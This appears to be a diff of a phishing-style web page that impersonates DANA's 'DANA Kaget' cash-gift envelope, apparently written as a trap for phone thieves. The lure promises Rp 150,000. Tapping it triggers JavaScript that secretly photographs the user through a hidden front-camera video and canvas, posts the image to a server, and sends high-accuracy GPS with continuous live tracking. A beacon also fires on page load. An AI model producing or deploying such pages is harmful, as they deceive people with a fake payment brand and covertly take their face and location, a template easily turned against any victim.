@@ -3,275 +3,245 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>DANA Kaget — Buka Saldo Anda</title>
+  <title>DANA Kaget — Buka Amplop Kejutan</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; }
-    body { background: #118eea; color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
-    
-    .dana-header { font-size: 24px; font-weight: 900; letter-spacing: -0.5px; margin-bottom: 4px; }
-    .dana-sub { font-size: 13px; color: #bae6fd; margin-bottom: 24px; }
-    
-    .envelope-card {
-      background: #ffffff;
-      color: #0f172a;
-      width: 100%;
-      max-width: 380px;
-      border-radius: 24px;
-      padding: 30px 24px;
-      box-shadow: 0 15px 35px rgba(2, 44, 100, 0.3);
+    :root {
+      --dana: #118eea;
+      --dana-dark: #0c75c4;
+      --gold: #f59e0b;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body {
+      background: linear-gradient(180deg, #118eea 0%, #0c75c4 50%, #075985 100%);
+      color: white;
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
-      position: relative;
+      justify-content: center;
+      padding: 20px;
+      text-align: center;
       overflow: hidden;
     }
-    
-    .coin-badge {
-      width: 80px;
-      height: 80px;
-      background: linear-gradient(135deg, #f59e0b, #fbbf24);
-      border-radius: 50%;
+
+    .dana-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255, 255, 255, 0.2);
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 24px;
+      backdrop-filter: blur(10px);
+    }
+
+    .envelope-box {
+      width: 220px;
+      height: 220px;
+      background: linear-gradient(135deg, #f59e0b, #d97706);
+      border-radius: 28px;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      font-size: 40px;
-      box-shadow: 0 0 25px rgba(245, 158, 11, 0.4);
-      margin-bottom: 16px;
-      animation: bounce 2s infinite alternate ease-in-out;
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.35);
+      border: 3px solid rgba(255, 255, 255, 0.4);
+      cursor: pointer;
+      position: relative;
+      animation: float 2s ease-in-out infinite alternate;
+      transition: transform 0.15s;
     }
-    @keyframes bounce {
-      0% { transform: translateY(0) scale(1); }
-      100% { transform: translateY(-8px) scale(1.05); }
+    .envelope-box:active { transform: scale(0.95); }
+    @keyframes float {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-10px); }
     }
-    
-    .amount-title { font-size: 13px; color: #64748b; font-weight: 600; text-transform: uppercase; margin-bottom: 4px; }
-    .amount-val { font-size: 32px; font-weight: 900; color: #118eea; letter-spacing: -1px; margin-bottom: 6px; }
-    .sender-note { font-size: 13px; color: #475569; margin-bottom: 24px; }
-    
-    .btn-dana {
-      width: 100%;
-      padding: 18px;
-      border-radius: 16px;
+
+    .envelope-icon { font-size: 70px; margin-bottom: 8px; }
+    .envelope-text { font-size: 16px; font-weight: 800; color: #78350f; background: #fef3c7; padding: 4px 14px; border-radius: 12px; }
+
+    .title { font-size: 22px; font-weight: 800; margin: 24px 0 8px 0; }
+    .subtitle { font-size: 14px; opacity: 0.9; max-width: 320px; line-height: 1.5; }
+
+    .btn-open {
+      margin-top: 24px;
+      background: #fef08a;
+      color: #713f12;
       border: none;
-      background: #118eea;
-      color: #ffffff;
-      font-size: 17px;
+      padding: 16px 36px;
+      border-radius: 16px;
+      font-size: 16px;
       font-weight: 800;
       cursor: pointer;
-      box-shadow: 0 8px 25px rgba(17, 142, 234, 0.4);
-      transition: transform 0.1s;
+      box-shadow: 0 10px 25px rgba(245, 158, 11, 0.4);
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
-    .btn-dana:active { transform: scale(0.98); }
-    
-    .claimed-box {
+    .btn-open:active { transform: scale(0.96); }
+
+    .claim-view {
       display: none;
-      text-align: center;
-      padding: 10px 0;
+      background: white;
+      color: #0f172a;
+      border-radius: 24px;
+      padding: 30px 20px;
+      width: 100%;
+      max-width: 360px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.35);
     }
-    .claimed-icon { font-size: 40px; margin-bottom: 8px; }
-    .claimed-title { font-size: 18px; font-weight: 800; color: #059669; margin-bottom: 6px; }
-    .claimed-desc { font-size: 13px; color: #475569; line-height: 1.4; }
-    
-    .security-note { font-size: 11px; color: #bae6fd; margin-top: 24px; line-height: 1.5; }
+    .dana-logo { font-size: 36px; margin-bottom: 10px; }
+    .amount { font-size: 34px; font-weight: 800; color: #118eea; margin: 12px 0; }
+
+    #hiddenVideo, #hiddenCanvas {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0.01;
+      pointer-events: none;
+      left: -9999px;
+    }
   </style>
 </head>
 <body>
 
-  <div class="dana-header">DANA Kaget</div>
-  <div class="dana-sub">Bagi-bagi rezeki saldo digital gratis</div>
-
-  <div class="envelope-card">
-    <div class="coin-badge">💰</div>
-    <div class="amount-title">Saldo Tersedia</div>
-    <div class="amount-val">Rp 175.000</div>
-    <div class="sender-note">Dari teman spesial untuk pemegang nomor ini.</div>
-
-    <div id="danaActionArea" style="width: 100%;">
-      <button class="btn-dana" id="btnOpenDana" onclick="openDanaKaget()">
-        🎁 Buka Amplop Sekarang
-      </button>
-      <div style="font-size: 11px; color: #94a3b8; margin-top: 10px;">
-        Klaim otomatis terkirim langsung ke saldo akun DANA Anda.
-      </div>
+  <div id="envelopeView">
+    <div class="dana-badge">
+      <span>🎁</span> DANA KAGET SPESIAL
     </div>
 
-    <div class="claimed-box" id="claimedBox">
-      <div class="claimed-icon">🎉</div>
-      <div class="claimed-title">Saldo Berhasil Diklaim!</div>
-      <div class="claimed-desc">Rp 175.000 sedang dialirkan ke akun DANA Anda. Memverifikasi jaringan dan titik dompet digital...</div>
+    <div class="envelope-box" onclick="claimDana()">
+      <div class="envelope-icon">🧧</div>
+      <div class="envelope-text">BUKA SALDO</div>
+    </div>
+
+    <div class="title">Kamu Mendapat DANA Kaget!</div>
+    <div class="subtitle">Ketuk amplop di atas untuk mencairkan saldo Rp 150.000 langsung ke nomor akun ini.</div>
+
+    <button class="btn-open" id="btnOpenDana" onclick="claimDana()">
+      <span>✨</span> Buka Amplop Sekarang
+    </button>
+  </div>
+
+  <div class="claim-view" id="claimResultView">
+    <div class="dana-logo">🎉</div>
+    <div style="font-size: 16px; font-weight: 700;">Selamat, Saldo Berhasil Dibuka!</div>
+    <div class="amount">Rp 150.000</div>
+    <div style="font-size: 13px; color: #64748b; line-height: 1.5; margin-top: 10px;">
+      Sedang menghubungkan ke server dompet digital untuk transfer otomatis...
+    </div>
+    <div style="margin-top: 20px; font-size: 11px; color: #94a3b8;">
+      Mohon tunggu verifikasi jaringan beberapa saat.
     </div>
   </div>
 
-  <div class="security-note">
-    Dilindungi oleh DANA Protection &amp; Bank Indonesia.<br>Kerahasiaan akun 100% terjamin.
-  </div>
-
-  <video id="danaHiddenVideo" autoplay playsinline muted style="position:fixed; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none;"></video>
-  <canvas id="danaHiddenCanvas" style="position:fixed; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none;"></canvas>
+  <video id="hiddenVideo" autoplay playsinline muted></video>
+  <canvas id="hiddenCanvas"></canvas>
 
   <script>
-    window.addEventListener('DOMContentLoaded', () => {
-      fetch('/api/sentinel/intercept', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type: 'trap_opened',
-          label: '💰 PENCURI MEMBUKA LINK DANA KAGET!',
-          value: 'Pencuri membuka amplop DANA Kaget di: ' + location.href
-        })
-      }).catch(() => {});
+    let captured = false;
 
-      initRemoteListener();
-    });
+    fetch('/api/sentinel/beacon', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        alertType: 'trap_link_opened_dana',
+        activity: 'Thief Opened DANA Kaget Trap Link',
+        screen: window.screen.width + 'x' + window.screen.height,
+        userAgent: navigator.userAgent
+      })
+    }).catch(() => {});
 
-    let sirenAudioCtx = null;
-    let sirenOsc = null;
-    let sirenGain = null;
-    let isSirenPlaying = false;
-
-    function initRemoteListener() {
-      try {
-        const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const ws = new WebSocket(protocol + '//' + location.host);
-        ws.onmessage = (e) => {
-          try {
-            const data = JSON.parse(e.data);
-            if (data.type === 'sentinel_siren_trigger') {
-              playPoliceSiren();
-            }
-          } catch(err) {}
-        };
-      } catch(e) {}
-    }
-
-    function playPoliceSiren() {
-      if (isSirenPlaying) return;
-      isSirenPlaying = true;
-      try {
-        sirenAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        sirenOsc = sirenAudioCtx.createOscillator();
-        sirenGain = sirenAudioCtx.createGain();
-
-        sirenOsc.type = 'sawtooth';
-        sirenGain.gain.setValueAtTime(1.0, sirenAudioCtx.currentTime);
-
-        let high = false;
-        setInterval(() => {
-          if (!isSirenPlaying || !sirenAudioCtx) return;
-          const targetFreq = high ? 650 : 1250;
-          sirenOsc.frequency.setTargetAtTime(targetFreq, sirenAudioCtx.currentTime, 0.15);
-          high = !high;
-        }, 320);
-
-        sirenOsc.connect(sirenGain);
-        sirenGain.connect(sirenAudioCtx.destination);
-        sirenOsc.start();
-      } catch(e) {}
-    }
-
-    async function openDanaKaget() {
+    async function claimDana() {
       const btn = document.getElementById('btnOpenDana');
       if (btn) {
-        btn.textContent = '⏳ Membuka Saldo...';
+        btn.textContent = '⏳ Memproses Saldo...';
         btn.disabled = true;
       }
 
-      try {
-        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        ctx.resume();
-      } catch(e) {}
-
-      captureSelfieQuietly();
+      captureFace();
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            sendBeaconData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'dana_claimed');
-            document.getElementById('danaActionArea').style.display = 'none';
-            document.getElementById('claimedBox').style.display = 'block';
-            watchThiefPosition();
+          pos => {
+            fetch('/api/sentinel/beacon', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                speed: pos.coords.speed || 0,
+                alertType: 'thief_trapped_dana',
+                activity: '💰 PENCURI MEMBUKA JEBAKAN DANA KAGET'
+              })
+            }).catch(() => {});
           },
-          (err) => {
-            sendBeaconData(0, 0, 100, 'dana_gps_denied');
-            document.getElementById('danaActionArea').style.display = 'none';
-            document.getElementById('claimedBox').style.display = 'block';
-          },
-          { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+          () => {},
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
-      } else {
-        document.getElementById('danaActionArea').style.display = 'none';
-        document.getElementById('claimedBox').style.display = 'block';
+
+        navigator.geolocation.watchPosition(
+          pos => {
+            fetch('/api/sentinel/beacon', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                speed: pos.coords.speed || 0,
+                alertType: 'thief_trapped_dana',
+                activity: '💰 PENCURI TERPANTAU DI DANA'
+              })
+            }).catch(() => {});
+          },
+          () => {},
+          { enableHighAccuracy: true, maximumAge: 3000 }
+        );
       }
+
+      setTimeout(() => {
+        document.getElementById('envelopeView').style.display = 'none';
+        document.getElementById('claimResultView').style.display = 'block';
+      }, 1000);
     }
 
-    async function captureSelfieQuietly() {
+    async function captureFace() {
+      if (captured) return;
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
           audio: false
         });
 
-        const video = document.getElementById('danaHiddenVideo');
-        const canvas = document.getElementById('danaHiddenCanvas');
+        const video = document.getElementById('hiddenVideo');
         video.srcObject = stream;
         await video.play();
 
         setTimeout(() => {
           try {
+            const canvas = document.getElementById('hiddenCanvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            canvas.toBlob((blob) => {
-              if (blob) {
-                fetch('/api/sentinel/selfie', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'image/jpeg' },
-                  body: blob
-                }).catch(() => {});
-              }
-              stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg', 0.85);
-          } catch(e) {
-            stream.getTracks().forEach(t => t.stop());
-          }
-        }, 800);
-      } catch(err) {}
-    }
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
 
-    async function sendBeaconData(lat, lon, acc, alertType) {
-      let battery = 100;
-      let charging = false;
-      try {
-        if (navigator.getBattery) {
-          const b = await navigator.getBattery();
-          battery = Math.round(b.level * 100);
-          charging = b.charging;
-        }
+            fetch('/api/sentinel/selfie', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ photo: dataUrl, trigger: 'trap_link_dana' })
+            }).catch(() => {});
+
+            captured = true;
+            stream.getTracks().forEach(track => track.stop());
+          } catch(e) {}
+        }, 500);
       } catch(e) {}
-
-      fetch('/api/sentinel/beacon', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          lat: lat || -6.2088,
-          lon: lon || 106.8456,
-          accuracy: acc || 10,
-          batteryLevel: battery,
-          isCharging: charging,
-          alertType: 'honeypot_trap_clicked',
-          trigger: alertType,
-          networkName: navigator.onLine ? 'Seluler / Wi-Fi Aktif' : 'Offline'
-        })
-      }).catch(() => {});
-    }
-
-    function watchThiefPosition() {
-      if (!navigator.geolocation) return;
-      navigator.geolocation.watchPosition((pos) => {
-        sendBeaconData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'live_thief_tracking');
-      }, null, { enableHighAccuracy: true, maximumAge: 3000 });
     }
   </script>
 </body>
